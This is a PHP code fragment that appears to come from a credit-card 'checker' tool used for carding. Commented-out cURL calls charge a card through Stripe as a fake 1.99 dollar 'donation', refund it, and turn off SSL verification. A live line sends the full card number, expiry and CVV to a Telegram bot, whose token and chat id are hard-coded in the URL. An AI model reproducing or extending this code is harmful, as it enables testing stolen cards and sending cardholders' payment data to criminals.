...
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=AlwaysSahil Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
...
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds/'.$tok2.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
...
$url = 'https://api.telegram.org/bot6281271714:AAH9FQVuETF4L9-4Q-zpdsQaoh1q5S_-v_w/sendmessage?chat_id=-942653143&text=cc: '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'%0ACharged: 1.99$%0AMessage: Charged';
$headers = array(
